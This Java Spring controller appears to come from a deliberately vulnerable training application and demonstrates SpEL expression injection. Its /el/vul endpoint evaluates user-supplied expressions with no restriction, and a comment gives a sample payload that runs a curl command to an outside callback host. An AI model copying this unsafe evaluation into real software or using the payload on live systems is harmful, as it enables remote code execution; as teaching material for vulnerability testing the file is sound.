package org.joychou.controller;

import org.hibernate.validator.internal.engine.MessageInterpolatorContext;
import org.hibernate.validator.internal.engine.messageinterpolation.FormatterWrapper;
import org.hibernate.validator.internal.engine.messageinterpolation.el.SimpleELContext;
import javax.validation.MessageInterpolator.Context;

import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.faces.context.FacesContext;
import javax.el.ELContext;
import javax.el.ExpressionFactory;
import javax.el.ValueExpression;
import java.util.Iterator;
import java.util.Map;

import java.util.Locale;


@RestController
public class EL {
    private static final ExpressionFactory expressionFactory = ExpressionFactory.newInstance();
    /**
     * SPEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @RequestMapping("/el/vul")
    private static String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // fix method: SimpleEvaluationContext
        String result = parser.parseExpression(expression).getValue().toString();
        return result;
    }


    public static void main(String[] args)  {
    }
}
